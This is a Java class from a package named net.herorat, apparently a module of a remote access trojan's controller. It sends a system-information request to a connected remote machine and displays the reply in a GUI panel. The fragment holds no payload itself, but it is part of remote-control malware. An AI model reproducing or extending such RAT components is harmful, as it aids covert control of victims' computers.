package net.herorat.features.system;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet7System;


public class System
{
	public static void send(Server server)
	{
		Packet p = new Packet7System(server.outputstream, new String[] { });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
		if (!server.equals(Main.mainWindow.PanelSystem.getCurrentServer())) return;
		
		StringBuffer buffer = new StringBuffer();
		for (String arg : args)
		{
			buffer.append(arg);
		}
		
		Main.mainWindow.PanelSystem.area_output.setText(buffer.toString());
	}
}